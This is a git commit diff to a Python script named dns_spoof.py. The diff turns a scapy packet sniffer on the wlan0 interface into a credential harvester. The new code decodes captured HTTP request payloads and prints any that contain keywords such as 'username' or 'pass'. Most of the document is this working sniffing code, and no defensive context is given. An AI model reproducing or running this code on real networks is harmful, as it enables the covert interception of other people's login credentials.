ee41ac02af146ba3e8f8bb63a54e3af5270f5c23
aditya-kharb <kharbaditya123@gmail.com>
2020-12-03 15:27:29 +0530

    initial commit

--- dns_spoof/dns_spoof.py
+++ dns_spoof/dns_spoof.py
@@ -7,5 +7,11 @@ def sniff_packet(interfaces):
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):#it will print every information printed through http
         if packet.haslayer(http.Raw):
-            print(packet[scapy.Raw].load)#it will only show password asn name
+            load_1 = packet[scapy.Raw].load#it will only show password asn name
+            load_2 = load_1.decode("utf")
+            keywords = ['username','name','pass','passwors']
+            for keyword in keywords:
+                if keyword in load_2:
+                    print(load_2)
+                    break
 sniff_packet("wlan0")
